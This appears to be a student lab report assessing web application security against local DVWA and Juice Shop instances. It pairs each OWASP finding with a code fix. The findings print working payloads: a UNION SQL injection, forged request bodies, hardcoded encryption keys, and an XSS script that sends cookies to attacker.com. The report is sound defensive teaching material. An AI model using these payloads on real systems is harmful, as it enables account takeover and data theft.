# Workstream B — Web Application Security Assessment
**Project KAVACH · Meridian FinServe Pvt. Ltd. (Fictional)**
**Team:** Team-09 · Tools: DVWA, OWASP Juice Shop (Docker), Burp Suite Community, curl, Semgrep CE

---

## Environment

| Component | Version | URL |
|-----------|---------|-----|
| DVWA | Latest (Docker) | `http://localhost:8082` |
| OWASP Juice Shop | Latest (Docker) | `http://localhost:3000` |

Setup: `docker-compose up -d` from `B.1 Test Environment/docker-compose.yml` — environment live in under 5 minutes.

---

## Findings Summary

| ID | Vulnerability | OWASP | Severity | App | Status |
|:--:|:---|:--:|:--:|:--:|:--:|
| F-01 | Broken Access Control — Forged Review | A01 | 🟠 High | Juice Shop | Patched |
| F-02 | Cryptographic Failures — XOR + AES-ECB | A02 | 🟠 High | DVWA | Patched |
| F-03a | SQL Injection | A03 | 🔴 Critical | DVWA | Patched |
| F-03b | Reflected XSS | A03 | 🟠 High | DVWA | Patched |
| F-04 | Insecure Design — BasketId Manipulation | A04 | 🟡 Medium | Juice Shop | Patched |
| F-05 | Auth Failures — Weak Credentials + No Rate Limit | A07 | 🟠 High | Juice Shop | Patched |

6 categories demonstrated — exceeds minimum of 5 required.

---

## F-01 · Broken Access Control (A01)

**Vulnerable endpoint:** `PUT /rest/products/{id}/reviews`

**What happened:** The `author` field in the request body is trusted directly — the server never cross-checks it against the JWT identity. Changing `author` to any victim email forges a review under their name.

**Payload:**
```json
{ "message": "Forged review text.", "author": "uvogin@juice-sh.op" }
```

**Business impact:** Attacker could post fraudulent complaints or defamatory content under any borrower or merchant identity on Meridian FinServe's portal.

**Fix:**
```diff
- const author = req.body.author;
+ const author = req.user.data.email;   // from verified JWT
```

---

## F-02 · Cryptographic Failures (A02)

**What happened:** Two compounding failures — (1) repeating-key XOR cipher with hardcoded key `wachtwoord` in PHP source, trivially reversible. (2) AES-128-ECB with hardcoded key `ik ben een aardb` — ECB mode enables block-level token forgery without knowing the key outright; leaked source gives the key anyway.

**Outcome:** Plaintext password (`Olifant`) recovered from ciphertext in one step. Admin session token forged by decrypting, modifying `"level":"user"` → `"level":"admin"`, re-encrypting.

**Business impact:** Any intercepted credential or session token on Meridian's network segment is recoverable in minutes using only CyberChef — granting access to all 180,000 borrower records.

**Fix:**
```diff
- openssl_decrypt($token, 'aes-128-ecb', $hardcodedKey);
+ openssl_decrypt($token, 'aes-256-gcm', getenv('APP_SECRET_KEY'), 0, $iv, $tag);
```

---

## F-03a · SQL Injection (A03) — Critical

**Vulnerable endpoint:** `GET /vulnerabilities/sqli/?id=`

**What happened:** User input is concatenated directly into the SQL query string. A UNION-based payload dumped the entire `users` table including MD5-hashed passwords, which were cracked offline immediately.

**Payload:**
```
1' UNION SELECT user,password FROM users--+
```

**Output:** `admin:5f4dcc3b5aa765d61d8327deb882cf99` (MD5 of "password") — cracked in seconds.

**Business impact:** Full database dump of Meridian's borrower records, Aadhaar-linked identities, and merchant credentials in a single query — RBI reportable breach.

**Fix:**
```diff
- $query = "SELECT * FROM users WHERE user_id = '$id'";
+ $stmt = $conn->prepare("SELECT * FROM users WHERE user_id = ?");
+ $stmt->bind_param("s", $id);
+ $stmt->execute();
```

---

## F-03b · Reflected XSS (A03)

**Vulnerable endpoint:** `GET /vulnerabilities/xss_r/?name=`

**What happened:** The `name` parameter is echoed raw into the HTML response. A `<script>` payload executes immediately in the browser. A crafted link delivers this to any victim.

**Session hijack payload:**
```html
<script>fetch('http://attacker.com/log?c='+document.cookie)</script>
```

**Business impact:** One phishing link sent to any of Meridian's 180,000 borrowers silently exfiltrates their session cookie — account takeover without needing credentials.

**Fix:**
```diff
- echo "Hello " . $_GET['name'];
+ echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```
Plus: `Content-Security-Policy: default-src 'self'; script-src 'self'`

---

## F-04 · Insecure Design (A04)

**Vulnerable endpoint:** `POST /api/BasketItems/`

**What happened:** The `BasketId` field is accepted from the request body with no ownership check. Supplying another user's basket ID adds items to their cart without their knowledge.

**Payload:**
```json
{ "ProductId": 1, "BasketId": "6", "quantity": 1 }
```
*(Basket 6 belongs to a different user — request returns HTTP 200.)*

**Business impact:** On Meridian's merchant portal, equivalent design flaw in a payment-cart endpoint allows cross-merchant transaction manipulation across all 22,000 merchant accounts.

**Fix:**
```diff
- const basketId = req.body.BasketId;
+ const userBasket = await Basket.findOne({ where: { UserId: req.user.id } });
+ const basketId = userBasket.id;
```

---

## F-05 · Auth Failures (A07)

**Vulnerable endpoint:** `POST /rest/user/login`

**What happened:** Admin account uses weak password (`admin@1`). No rate-limiting, no lockout, no CAPTCHA. 50 sequential brute-force attempts via Burp Intruder — all returned HTTP 401 with zero throttling, block, or delay.

**Confirmed:** Login succeeded first attempt with default credentials. JWT returned grants full admin access.

**Business impact:** Automated credential-stuffing against Meridian's portal could compromise admin accounts within hours — full access to all borrower and merchant data, constituting an RBI reportable breach and PCI-DSS violation.

**Fix:**
```diff
+ const loginLimiter = rateLimit({ windowMs: 15*60*1000, max: 5 });
- router.post('/login', handler)
+ router.post('/login', loginLimiter, handler)
```

---

## B.4 SAST — Before / After

**Tool:** Semgrep CE · `semgrep --config=p/owasp-top-ten`

| Rule | Before | After |
|------|:------:|:-----:|
| `php.lang.security.mysqli-concat` (SQLi) | ❌ ERROR | ✅ Resolved |
| `php.lang.security.xss-injection` (XSS) | ❌ ERROR | ✅ Resolved |
| `javascript.express.security.audit.jwt-idor` (IDOR) | ❌ ERROR | ✅ Resolved |
| `javascript.express.security.audit.missing-rate-limiting` | ⚠️ WARNING | ✅ Resolved |
| `javascript.express.security.audit.directory-listing` | ⚠️ WARNING | ⚠️ Residual* |

*Residual: compensating control applied (auth gate on `/ftp` route). Full fix (explicit file allowlist) deferred. Semgrep still flags the syntax pattern — expected, documented in `2.after.json`.

Net: **4 of 5 findings resolved**. 3 findings carry code-level patches. All 5 are accounted for.

---

## Reproducibility

All findings reproducible from this repository alone:

```bash
cd 2.Webapp/B.1\ Test\ Environment/
docker-compose up -d
# DVWA at localhost:8082  (admin/password)
# Juice Shop at localhost:3000
```

Each finding folder under `B.2 Findings/` contains the exact curl command, Burp request, and response screenshots needed to reproduce the exploit independently.

---

*Project KAVACH · Workstream B · Futurense AI Clinic × IIT Roorkee*
*All testing performed against local Docker instances. No production systems accessed. All data synthetic.*
